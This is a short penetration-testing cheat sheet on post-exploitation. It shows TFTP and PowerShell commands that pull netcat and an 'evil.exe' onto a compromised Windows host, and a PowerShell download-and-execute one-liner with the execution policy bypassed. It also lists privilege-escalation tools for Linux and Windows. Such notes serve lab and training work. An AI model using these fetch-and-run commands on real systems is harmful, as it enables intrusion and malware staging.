# Post Exploitation

## **File Transfers**

- TFTP
  ```bash
    kali@kali:~# mkdir /tftp
    kali@kali:~# atftpd --daemon --port 69 /tftp
    kali@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
    
    C:\Users\Bob>tftp -i 10.11.0.5 get nc.exe
    ```
- PowerShell
  ```bash
    C:\Users\Bob> echo $storageDir = $pwd > wget.ps1
    C:\Users\Bob> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    C:\Users\Bob> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
    C:\Users\Bob> echo $file = "new-exploit.exe" >>wget.ps1
    C:\Users\Bob> echo $webclient.DownloadFile($url,$file) >>wget.ps1
    #Finally we run the downloaded script
    C:\Users\Bob> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
  ```
  - Download and execute in PowerShell
    ```ps1
      powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.23/exploit.ps1');
    ```
- Python
  ```bash
    python -m SimpleHTTPServer [PORT] 
  ```
  
  
## **Linux Privilege Escalation**

- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [Linux Smart Enum](https://github.com/diego-treitos/linux-smart-enumeration)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [BeRoot](https://github.com/AlessandroZ/BeRoot)
- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [Unix Privesc Check](https://github.com/pentestmonkey/unix-privesc-check)
- [Privilage Escalation through sudo](https://github.com/TH3xACE/SUDO_KILLER)

## **Windows Privilege Escalation**

- [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
- [Watson](https://github.com/rasta-mouse/Watson)
- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [BeRoot](https://github.com/AlessandroZ/BeRoot)
- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
- [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
- [Windows Exploits](https://github.com/abatchy17/WindowsExploits)
- [Windows Enum](https://github.com/absolomb/WindowsEnum)
- [SeatBelt](https://github.com/GhostPack/Seatbelt)
- [Powerless](https://github.com/M4ximuss/Powerless)
- [JAWS](https://github.com/411Hall/JAWS)
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
- [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
- [Privesc Check](https://github.com/itm4n/PrivescCheck)
